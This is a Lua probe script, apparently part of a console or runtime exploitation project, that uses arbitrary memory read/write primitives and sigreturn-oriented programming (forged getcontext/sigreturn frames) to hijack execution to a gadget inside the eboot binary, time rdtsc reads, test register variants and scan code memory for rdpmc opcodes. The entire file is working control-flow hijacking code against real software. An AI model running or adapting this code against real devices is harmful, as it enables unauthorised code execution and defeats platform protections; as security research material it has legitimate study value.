-- CRASH_CLASS: LOW
-- PROBE 1403a: SROP-based rdtsc test
--
-- Uses the sigreturn technique from 185f to execute rdtsc at eboot+0x6A109
-- with controlled registers. The gadget at +0x6A109:
--   rdtsc; rol bl,0x48; lea edx,[rcx+1]; ... mov sil,[rcx]; ... mov al,1; ret
-- Returns TSC_lo with low byte = 1 (upper 24 bits preserved).
-- Sets RCX to point to a null byte so the string loop exits immediately.
--
-- Also scans for rdpmc (0F 33) as alternative timing source.

print("=== 1403a: SROP rdtsc ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wq(a, v) memory.write_qword(a, v) end
local function wd(a, v) memory.write_dword(a, v) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

-- Get eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("eboot=" .. string.format("0x%X%08X", text_hi, text_lo))

-- ============================================================
-- [A] SROP setup (from 185f pattern)
-- ============================================================
print("")
print("=== [A] SROP setup ===")

local sc_gc = mk(421)  -- getcontext
local sc_sr = mk(417)  -- sigreturn
local MC = 0x40         -- mcontext offset in ucontext

local ctx = memory.alloc(0x500)
local ok_gc = pcall(function() return sc_gc(uint64(N(ctx))) end)
if not ok_gc then print("getcontext FAIL") return end

-- Extract syscall address (RIP - 2)
local brip = rq(N(ctx) + MC + 0xA0)
if not brip then print("no RIP in context") return end
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("syscall_addr=" .. string.format("0x%X%08X", rh, rl - 2))

-- Test: getpid via SROP
local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(N(ctx))) end)
    wq(N(ctx) + MC + 0xA0, sc_addr)       -- RIP = syscall
    wq(N(ctx) + MC + 0x38, uint64(num))   -- RAX = syscall number
    if a1 then wq(N(ctx) + MC + 0x08, a1) end  -- RDI
    if a2 then wq(N(ctx) + MC + 0x10, a2) end  -- RSI
    if a3 then wq(N(ctx) + MC + 0x18, a3) end  -- RDX
    if a4 then wq(N(ctx) + MC + 0x50, a4) end  -- RCX (r10 for syscall?)
    if a5 then wq(N(ctx) + MC + 0x28, a5) end  -- R8
    if a6 then wq(N(ctx) + MC + 0x30, a6) end  -- R9
    local ok, rv = pcall(function() return sc_sr(uint64(N(ctx))) end)
    if not ok then return nil end
    return rv
end

local pid = srop(20)  -- getpid
if pid then
    print("srop getpid=" .. N(pid))
else
    print("srop getpid FAIL")
end

-- ============================================================
-- [B] SROP rdtsc — set RIP to eboot+0x6A109
-- ============================================================
print("")
print("=== [B] SROP rdtsc ===")

-- Prepare a buffer with a null byte for RCX
local null_buf = memory.alloc(8)
wd(N(null_buf), 0)  -- null byte

-- rdtsc gadget address
local rdtsc_addr = eboot + uint64(0x6A109)
print("rdtsc_addr=" .. string.format("0x%X%08X", text_hi, text_lo + 0x6A109))

-- Execute rdtsc via SROP
-- Set RIP = rdtsc gadget, RCX = null_buf (so the string loop exits)
-- After execution: EAX = (TSC_lo & 0xFFFFFF00) | 0x01
local function srop_rdtsc()
    pcall(function() return sc_gc(uint64(N(ctx))) end)
    wq(N(ctx) + MC + 0xA0, rdtsc_addr)          -- RIP = rdtsc gadget
    wq(N(ctx) + MC + 0x50, uint64(N(null_buf)))  -- RCX = &null_byte
    -- Don't modify RSP — it's saved by getcontext and will return correctly
    local ok, rv = pcall(function() return sc_sr(uint64(N(ctx))) end)
    if not ok then return nil end
    return rv
end

-- Test 1: does it return at all?
print("  calling srop_rdtsc...")
local v1 = srop_rdtsc()
if v1 then
    local h1, l1 = get_hi_lo(v1)
    print(string.format("  v1 = 0x%X%08X", h1, l1))

    -- Test 2: does it give different values? (TSC should increment)
    local v2 = srop_rdtsc()
    if v2 then
        local h2, l2 = get_hi_lo(v2)
        print(string.format("  v2 = 0x%X%08X", h2, l2))

        -- Check low byte (should be 1 for both)
        print(string.format("  low_byte: v1=%d v2=%d", l1 % 256, l2 % 256))

        -- Delta in upper bits
        local d = l2 - l1
        if d < 0 then d = d + 0x100000000 end
        print(string.format("  raw_delta=%d", d))
        -- The actual TSC delta is d (since low byte is same for both)
        -- Resolution: 256 cycles per unit (lost low 8 bits)
        print(string.format("  tsc_units=%d (~%d us at 3.5GHz)", d / 256, d / 3500))
    end

    -- Multiple readings for statistics
    print("")
    print("  10 readings:")
    local readings = {}
    for i = 1, 10 do
        local v = srop_rdtsc()
        if v then
            local _, l = get_hi_lo(v)
            readings[#readings + 1] = l
            if i <= 5 then
                print(string.format("  [%d] 0x%08X  lo=%d", i, l, l % 256))
            end
        else
            print(string.format("  [%d] FAIL", i))
            break
        end
    end

    if #readings >= 2 then
        local deltas = {}
        for i = 2, #readings do
            local d = readings[i] - readings[i-1]
            if d < 0 then d = d + 0x100000000 end
            deltas[#deltas + 1] = d
        end
        table.sort(deltas)
        print(string.format("  min_delta=%d max=%d median=%d",
            deltas[1], deltas[#deltas], deltas[math.floor(#deltas/2)+1]))
        print(string.format("  ~%d ns per SROP call (median delta / 3.5GHz)",
            math.floor(deltas[math.floor(#deltas/2)+1] / 3.5)))
    end
else
    print("  SROP rdtsc FAILED — gadget crashed or didn't return")
end

-- ============================================================
-- [C] Quick: is RCX the issue? Try different RCX values
-- ============================================================
if not v1 then
    print("")
    print("=== [C] RCX variants ===")

    -- Try with RCX = eboot (RX memory, will have null bytes)
    pcall(function() return sc_gc(uint64(N(ctx))) end)
    wq(N(ctx) + MC + 0xA0, rdtsc_addr)
    wq(N(ctx) + MC + 0x50, eboot)  -- RCX = eboot base (readable)
    local ok2, rv2 = pcall(function() return sc_sr(uint64(N(ctx))) end)
    if ok2 and rv2 then
        local h, l = get_hi_lo(rv2)
        print(string.format("  RCX=eboot: 0x%X%08X", h, l))
    else
        print("  RCX=eboot: FAIL")
    end

    -- Try with RCX = ctx buffer (heap, readable)
    pcall(function() return sc_gc(uint64(N(ctx))) end)
    wq(N(ctx) + MC + 0xA0, rdtsc_addr)
    wq(N(ctx) + MC + 0x50, uint64(N(ctx)))  -- RCX = ctx (heap)
    local ok3, rv3 = pcall(function() return sc_sr(uint64(N(ctx))) end)
    if ok3 and rv3 then
        local h, l = get_hi_lo(rv3)
        print(string.format("  RCX=ctx: 0x%X%08X", h, l))
    else
        print("  RCX=ctx: FAIL")
    end
end

-- ============================================================
-- [D] Direct SROP rdtsc: set RIP to the 2 bytes 0F 31 only
-- Then set RSP so after rdtsc+next-instr-crash the signal
-- doesn't matter because we use sigreturn to jump BACK
-- Actually this won't work cleanly. Skip.
-- ============================================================

-- ============================================================
-- [E] Scan for rdpmc (0F 33) in first 2MB
-- ============================================================
print("")
print("=== [E] rdpmc scan ===")
local rdpmc_count = 0
for off = 0, 0x200000 - 4, 4 do
    local d = rd(N(eboot) + off)
    if d then
        local b0 = d % 256
        local b1 = math.floor(d / 256) % 256
        local b2 = math.floor(d / 65536) % 256
        local b3 = math.floor(d / 16777216) % 256
        if b0 == 0x0F and b1 == 0x33 then rdpmc_count = rdpmc_count + 1 end
        if b1 == 0x0F and b2 == 0x33 then rdpmc_count = rdpmc_count + 1 end
        if b2 == 0x0F and b3 == 0x33 then rdpmc_count = rdpmc_count + 1 end
    end
end
print("rdpmc hits=" .. rdpmc_count)

print("")
print("=== 1403a DONE ===")
